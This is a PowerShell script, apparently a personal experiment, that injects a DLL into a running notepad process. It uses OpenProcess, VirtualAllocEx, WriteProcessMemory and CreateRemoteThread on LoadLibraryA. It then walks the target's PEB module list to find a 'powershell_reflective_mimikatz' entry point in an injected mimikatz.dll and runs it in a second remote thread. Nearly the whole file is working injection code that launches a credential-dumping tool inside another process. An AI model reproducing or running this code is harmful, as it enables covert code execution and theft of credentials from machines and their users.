



$User32 = Add-Type -MemberDefinition @"
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern bool MessageBox(
        IntPtr hWnd,     /// Parent window handle 
        String text,     /// Text message to display
        String caption,  /// Window caption
        int options);    /// MessageBox type
"@ -Name "user32" -NameSpace Win32 -PassThru

Add-Type -typeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class Shell32_CommandLineToArgvW {
    [DllImport("shell32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr CommandLineToArgvW(
        String lpCmdLine,  // コマンドライン文字列へのポインタ
        ref int pNumArgs        // 引数の数を受け取る変数へのポインタ
    );
}
"@ -PassThru

Add-Type -typeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class Kernel32_OpenProcess {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,  // アクセスフラグ
        bool bInheritHandle,    // ハンドルの継承オプション
        uint dwProcessId       // プロセス識別子
    );
}

public static class kernel32_WriteProcessMemory {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,               // プロセスのハンドル
        IntPtr lpBaseAddress,          // 書き込み開始アドレス
        byte[] lpBuffer,               // データバッファ
        uint nSize,                   // 書き込みたいバイト数
        ref uint lpNumberOfBytesWritten // 実際に書き込まれたバイト数
    );    
}

public static class kernel32_ReadProcessMemory {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,             // プロセスのハンドル
        IntPtr lpBaseAddress,       // 読み取り開始アドレス
        IntPtr lpBuffer,             // データを格納するバッファ
        uint nSize,                 // 読み取りたいバイト数
        ref uint lpNumberOfBytesRead  // 読み取ったバイト数
    );   
}

public static class Kernel32_VirtualAllocEx {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,         // 割り当てたいメモリを保持するプロセス
        IntPtr lpAddress,        // 割り当てたい開始アドレス
        uint dwSize,            // 割り当てたい領域のバイト単位のサイズ
        uint flAllocationType,  // 割り当てのタイプ
        uint flProtect          // アクセス保護のタイプ
    );
}

public static class Kernel32_GetModuleHandle {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(
        byte[] lpModuleName   // モジュール名
    );
}

public static class Kernel32_GetProcAddress {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetProcAddress(
      IntPtr hModule,    // DLL モジュールのハンドル
      byte[] lpProcName   // 関数名
    );
}

public static class Kernel32_CreateRemoteThread {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,        // 新しいスレッドを稼働させるプロセスを識別するハンドル
        IntPtr lpThreadAttributes,
                                // スレッドのセキュリティ属性へのポインタ
        uint dwStackSize,     // 初期のスタックサイズ (バイト数)
        IntPtr lpStartAddress,
                               // スレッド関数へのポインタ
        IntPtr lpParameter,     // 新しいスレッドの引数へのポインタ
        uint dwCreationFlags,  // 作成フラグ
        IntPtr lpThreadId      // 取得したスレッド識別子へのポインタ
    );
}

public static class Kernel32_WaitForSingleObject {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,        // オブジェクトのハンドル
        uint dwMilliseconds   // タイムアウト時間 (Milli Seconds)
    );
}

public static class Kernel32_CloseHandle {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern bool CloseHandle(
        IntPtr hObject   // オブジェクトのハンドル
    );
}

public static class Kernel32_VirtualFreeEx {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern bool VirtualFreeEx(
        IntPtr hProcess,  // 解放したいメモリを保持するプロセス
        IntPtr lpAddress, // 解放したいメモリ領域の開始アドレス
        uint dwSize,     // 解放したいメモリ領域のバイト単位のサイズ
        uint dwFreeType  // 解放操作のタイプ
    );
}

public static class Kernel32_GetLastError {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern uint GetLastError(
    );
}

// public static class Kernel32_CreateEnvironmentBlock {
//     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
//     public static extern bool CreateEnvironmentBlock(
//         IntPtr *lpEnvironment,
//         IntPtr HANDLE hToken,
//         bool bInherit
//     );
// }

public static class Kernel32_AttachConsole {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern bool AttachConsole(
            uint dwProcessId
        );
}

public static class Kernel32_FreeConsole {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern bool FreeConsole(
        );
}

public static class Kernel32_GetStdHandle {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetStdHandle(
            int nStdHandle   // 入力デバイス、出力デバイス、エラーデバイスのいずれか
        );
}

public static class Kernel32_ReadConsoleOutputCharacter {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern bool ReadConsoleOutputCharacter(
            IntPtr hConsoleOutput,
                              // コンソールスクリーンバッファのハンドル
            ref String lpCharacter, // 読み取った文字を受け取るバッファのアドレス
            uint nLength,      // 読み取り元の文字セル数
            short[] dwReadCoord,  // 読み取り元セルの先頭の座標
            ref uint lpNumberOfCharsRead
                              // 読み取ったセル数のアドレス
        );
}

public static class Kernel32_WriteConsoleOutputCharacter {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern bool WriteConsoleOutputCharacter(
            IntPtr  hConsoleOutput,
            String lpCharacter,
            uint   nLength,
            short[]   dwWriteCoord,
            ref uint lpNumberOfCharsWritten
        );
}

"@ -PassThru

# Echo $User32
# Echo $Kernel32

function Invoke-Inject {

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    #orig: http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    Function Create-RemoteThread {
        Write-Verbose "Create-RemoteThread"

    }

    Function Get-LastError {
        Write-Verbose ("GetLastError() = " + ([Runtime.InteropServices.Marshal]::GetLastWin32Error()).ToString("#"))
    }

    Function Main {
        Write-Verbose "Main"

        $RemoteProcHandle = [IntPtr]::Zero
        $ProcName = "notepad"
        # $ProcName = "cmd"

        $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
        if ($Processes.Count -eq 0) {
            Throw "Can't find process $ProcName"
        }
        else {
            $ProcId = $Processes[0].ID
        }
        Write-Verbose "Get-Process $ProcName = $ProcId"

        $utf8Enc = [system.Text.Encoding]::UTF8

        $PROCESS_ALL_ACCESS = 2035711
        $hProcess = [Kernel32_OpenProcess]::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcId)
        Write-Verbose "OpenProcess(PID = $ProcId) = $hProcess"


        $MEM_COMMIT = 0x00001000
        $PAGE_READWRITE = 0x4
        $len = 128
        $writeLen = 0
        [byte[]]$dllPath = $utf8Enc.GetBytes("E:\C93\mimikatz.dll") # for 64 bit 
        # [byte[]]$dllPath = $utf8Enc.GetBytes("E:\C93\spy.dll") # for 64 bit 
        # [byte[]]$dllPath = $utf8Enc.GetBytes("E:\C93\spy_x86.dll") # for 32 bit 
        # [byte[]]$dllPath = $utf8Enc.GetBytes("E:\C93\calc.dll") # for 32 bit 
        Write-Host ("Injacted DLL = " + $utf8Enc.GetString($dllPath))
        # $hDllPath = [MarshalAs(UnmanagedType.LPStr)]$dllPath
        $baseAddr = [Kernel32_VirtualAllocEx]::VirtualAllocEx($hProcess, 0, $len, $MEM_COMMIT, $PAGE_READWRITE)
        Write-Verbose ("VirtualAllocEx() = " + ([Int64]$baseAddr).ToString("X0"))
        $res = [kernel32_WriteProcessMemory]::WriteProcessMemory($hProcess, $baseAddr, $dllPath, $len, [ref] $writeLen)
        if ($res -eq 0) {
            Throw "WriteProcessMemory failed"
        }

        # ===== CANNOT BE GET Handle of Kernel32.dll ====
        # $hDLLKernel32 = [Kernel32_GetModuleHandle]::GetModuleHandle($utf8Enc.GetBytes("kernel32"))
        # if ($hDLLKernel32 -eq 0) {
        #     Throw "GetModuleHandle() failed"
        # }
        # Write-Verbose "GetModuleHandle() = $hDLLKernel32"
        # 
        # $aLoadLibraryA = [Kernel32_GetProcAddress]::GetProcAddress($hDLLKernel32, $utf8Enc.GetBytes("LoadLibraryA"))
        # Write-Verbose "GetProcAddress() = $aLoadLibraryA"
        # ===============================================

        $aLoadLibraryA = Get-ProcAddress kernel32.dll LoadLibraryA
        Write-Verbose ("GetProcAddress() = " + ([Int64]$aLoadLibraryA).ToString("X0"))
        $hThread = [Kernel32_CreateRemoteThread]::CreateRemoteThread($hProcess, 0, 0, $aLoadLibraryA, $baseAddr, 0, 0)
        if ($hThread -eq 0) {
            Throw "CreateRemoteThread() failed"
        }
        Write-Verbose ("CreateRemoteThread() = " + ([Int64]$hThread).ToString("X0"))
        # Error Code reference: https://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
        # Write-Verbose ("GetLastError() = " + ([Kernel32_GetLastError]::GetLastError()).ToString("#"))
        Get-LastError

        $timeout = 30 * 1000 # 30 sec
        Write-Host "[*] executing payload. (timeout is $timeout ms)"
        $res = [Kernel32_WaitForSingleObject]::WaitForSingleObject($hThread, $timeout)
        $WAIT_TIMEOUT = 258
        if ($res -eq 0) {
            Write-Verbose "Thread exited"
        }
        elseif ($res -eq $WAIT_TIMEOUT) {
            Write-Verbose "WaitForSingleObject() = WAIT_TIMEOUT"
        }
        else {
            Write-Verbose "WaitForSingleObject() = $res"
            Get-LastError
        }


        # initialize $ProcessBasicInfo
        try { $NativeMethods = @([AppDomain]::CurrentDomain.GetAssemblies() | % { $_.GetTypes() } | ? { $_.FullName -eq 'Microsoft.Win32.NativeMethods' })[0] } catch {}
        $NtProcessBasicInfo = $NativeMethods.GetNestedType('NtProcessBasicInfo', [Reflection.BindingFlags]::NonPublic)
        $NtProcessBasicInfoConstructor = $NtProcessBasicInfo.GetConstructors()[0]
        $ProcessBasicInfo = $NtProcessBasicInfoConstructor.Invoke($null)
        if ($ProcessBasicInfo -eq $null) {
            Throw "ProcessBasicInfo = null"
        }
        # orig: Get-PEB.ps1
        $OSArchitecture = [Int](Get-WmiObject Win32_OperatingSystem).OSArchitecture.Split('-')[0].Split(' ')[0]
        try { $NativeUtils = [NativeUtils] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
        {
            $DynAssembly = New-Object Reflection.AssemblyName('MemHacker')
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MemHacker', $False)
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('NativeUtils', $Attributes, [ValueType])
            if ($TypeBuilder -eq $null) {
                Throw "TypeBuilder = null"
            }
            $TypeBuilder.DefinePInvokeMethod('ReadProcessMemory', 'kernel32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto') | Out-Null
            # $TypeBuilder.DefinePInvokeMethod('VirtualQueryEx', 'kernel32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [UInt32], @([IntPtr], [IntPtr], $MEMORY_BASIC_INFORMATION.MakeByRefType(), [UInt32]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto') | Out-Null
            if ($OSArchitecture -eq 64)
            {
                $TypeBuilder.DefinePInvokeMethod('IsWow64Process', 'kernel32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [Bool].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto') | Out-Null
            }
            $TypeBuilder.DefinePInvokeMethod('NtQueryInformationProcess', 'ntdll.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [UInt32], @([IntPtr], [Int], $NtProcessBasicInfo, [Int], [IntPtr]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto') | Out-Null
            $NativeUtils = $TypeBuilder.CreateType()
            if ($NativeUtils -eq $null) {
                Throw "NativeUtils = null"
            }
        }

        # update $ProcessBasicInfo 
        $id = (ps $ProcName)[0].Id
        if ($id -eq $null) {
            Throw "process id is blank"
        }
        $Process = Get-Process -Id $id -ErrorVariable GetProcessError
        Write-Verbose $Process
        $Handle = $Process.Handle
        $Status = $NativeUtils::NtQueryInformationProcess($Handle, 0, $ProcessBasicInfo, [Runtime.InteropServices.Marshal]::SizeOf($ProcessBasicInfo), [IntPtr]::Zero)
        Write-Verbose 'ProcessBasicInfo:'
        # Write-Host ($ProcessBasicInfo | Out-String)       

        $ByteWidth = 8 # 64bit
        $PebBaseAddr = [IntPtr]$ProcessBasicInfo.PebBaseAddress
        Write-Verbose ("PebBaseAddr = " + ($PebBaseAddr).ToString("X0"))
        $BytesRead = [UInt32] 0
        $LdrPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ByteWidth)
        $NativeUtils::ReadProcessMemory($Handle, [IntPtr]::Add($PebBaseAddr, 0x018), $LdrPtr, $ByteWidth, [Ref] $BytesRead)
        $Ldr = [Runtime.InteropServices.Marshal]::ReadIntPtr($LdrPtr)
        Write-Verbose ("LDR = " + ($Ldr).ToString("X0"))

        $InLoadOrderModuleListPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ByteWidth)
        $NativeUtils::ReadProcessMemory($Handle, [IntPtr]::Add([IntPtr]$Ldr, 0x010), $InLoadOrderModuleListPtr, $ByteWidth, [Ref] $BytesRead)
        $InLoadOrderModuleList = [Runtime.InteropServices.Marshal]::ReadIntPtr($InLoadOrderModuleListPtr)
        Write-Verbose ("InLoadOrderModuleListPtr = " + ($InLoadOrderModuleList).ToString("X0"))

        $PrevPtr = [IntPtr]$InLoadOrderModuleList
        while ($true) {
            # Get Flink
            $FlinkPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ByteWidth)
            $res = $NativeUtils::ReadProcessMemory($Handle, [IntPtr]::Add($PrevPtr, 0x0), $FlinkPtr, $ByteWidth, [Ref] $BytesRead)
            $Flink = [Runtime.InteropServices.Marshal]::ReadIntPtr($FlinkPtr)
            # Get FullDllName (address)
            $FullDllNamePtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ByteWidth)
            $res = $NativeUtils::ReadProcessMemory($Handle, [IntPtr]::Add([IntPtr]$Flink, 0x048 + 8), $FullDllNamePtr, $ByteWidth, [Ref] $BytesRead)
            $FullDllName = [Runtime.InteropServices.Marshal]::ReadIntPtr($FullDllNamePtr)
            # Get *FullDllName (content)
            $FullDllNameStrPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal(256)
            $res = $NativeUtils::ReadProcessMemory($Handle, [IntPtr]$FullDllName, $FullDllNameStrPtr, 256, [Ref] $BytesRead)
            $FullDllNameStr = [Runtime.InteropServices.Marshal]::PtrToStringAuto($FullDllNameStrPtr)        
            if ($FullDllNameStr.Contains("E:\")) { # FIXME
                Write-Verbose ("_LIST_ENTRY::Flink = " + ($Flink).ToString("X0"))
                Write-Verbose ("_LDR_DATA_TABLE_ENTRY::FullDllName = " + ($FullDllName).ToString("X0"))
                Write-Verbose ("*(_LDR_DATA_TABLE_ENTRY::FullDllName) = $FullDllNameStr")
                $BaseAddressPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ByteWidth)
                $res = $NativeUtils::ReadProcessMemory($Handle, [IntPtr]::Add([IntPtr]$Flink, 0x030), $BaseAddressPtr, $ByteWidth, [Ref] $BytesRead)
                $BaseAddress = [Int64][Runtime.InteropServices.Marshal]::ReadIntPtr($BaseAddressPtr)
                Write-Verbose ("_LDR_DATA_TABLE_ENTRY::BaseAddress = " + ($BaseAddress).ToString("X0"))

                $powershell_reflective_mimikatz = $BaseAddress + 0x48740
                Write-Host ("[*] powershell_reflective_mimikatz = " + ($powershell_reflective_mimikatz).ToString("X0"))
                break
            }
            $PrevPtr = [IntPtr]$Flink
        }

        # [byte[]] $arg = $utf8Enc.GetBytes("privillege::debug exit")
        [byte[]] $arg = (104, 0, 101, 0, 108, 0, 112, 0) # "help"
        $res = [kernel32_WriteProcessMemory]::WriteProcessMemory($hProcess, $baseAddr, $arg, $len, [ref] $writeLen)
        # [Int] $nArgv = 0
        # $ArgvPtr = [Shell32_CommandLineToArgvW]::CommandLineToArgvW("help", [ref]$nArgv)
        # Write-Verbose ("!CommandLineToArgvW() = " + ([Int64][Runtime.InteropServices.Marshal]::ReadIntPtr($ArgvPtr)).ToString("X0"))
        # $res = [kernel32_WriteProcessMemory]::WriteProcessMemory($hProcess, [IntPtr]::Add($baseAddr, 0x100), [byte[]][BitConverter]::GetBytes([Int64]$ArgvPtr), 8, [ref] $writeLen)
        if ($res -eq 0) {
            Throw "WriteProcessMemory failed"
        }        
        $hThread = [Kernel32_CreateRemoteThread]::CreateRemoteThread($hProcess, 0, 0, $powershell_reflective_mimikatz, $baseAddr, 0, 0)
        if ($hThread -eq 0) {
            Throw "CreateRemoteThread() failed"
        }
        Write-Verbose ("CreateRemoteThread() = " + ([Int64]$hThread).ToString("X0"))
        Write-Verbose ("GetLastError() = " + ([Runtime.InteropServices.Marshal]::GetLastWin32Error()).ToString("#"))

        $timeout = 30 * 1000 # 30 sec
        Write-Host "[*] executing payload. (timeout is $timeout ms)"
        $res = [Kernel32_WaitForSingleObject]::WaitForSingleObject($hThread, $timeout)
        $WAIT_TIMEOUT = 258
        if ($res -eq 0) {
            Write-Verbose "Thread exited"
        }
        elseif ($res -eq $WAIT_TIMEOUT) {
            Write-Verbose "WaitForSingleObject() = WAIT_TIMEOUT"
        }
        else {
            Write-Verbose "WaitForSingleObject() = $res"
            Get-LastError
        }  
  
        # fini
        $res = [Kernel32_CloseHandle]::CloseHandle($hThread)
        $MEM_RELEASE = 0x8000
        $res = [Kernel32_VirtualFreeEx]::VirtualFreeEx($hProcess, $baseAddr, $len, $MEM_RELEASE)
        $res = [Kernel32_CloseHandle]::CloseHandle($hProcess)        
    }

    $VerbosePreference = "Continue"
    Main
}

Invoke-Inject